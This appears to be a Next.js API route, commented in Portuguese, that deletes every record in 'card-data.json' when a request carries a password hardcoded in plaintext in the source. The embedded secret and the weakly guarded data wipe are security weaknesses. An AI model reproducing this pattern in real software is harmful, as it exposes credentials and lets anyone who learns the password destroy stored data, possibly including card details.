import { type NextRequest, NextResponse } from "next/server"
import fs from 'fs'
import path from 'path'

export async function POST(request: NextRequest) {
  try {
    const { password } = await request.json()
    
    // Verificar senha
    if (password !== 'vipcolheita2025') {
      return NextResponse.json({ 
        success: false,
        error: "Senha incorreta"
      }, { status: 401 })
    }
    
    // Caminho do arquivo JSON
    const filePath = path.join(process.cwd(), 'card-data.json')
    
    // Apagar dados (criar arquivo vazio)
    try {
      fs.writeFileSync(filePath, JSON.stringify([], null, 2))
      
      return NextResponse.json({ 
        success: true,
        message: "Todos os dados foram apagados"
      })
    } catch (error) {
      return NextResponse.json({ 
        success: false,
        error: "Erro ao apagar dados"
      }, { status: 500 })
    }
  } catch (error) {
    return NextResponse.json({ 
      success: false,
      error: "Erro ao processar requisição"
    }, { status: 500 })
  }
}
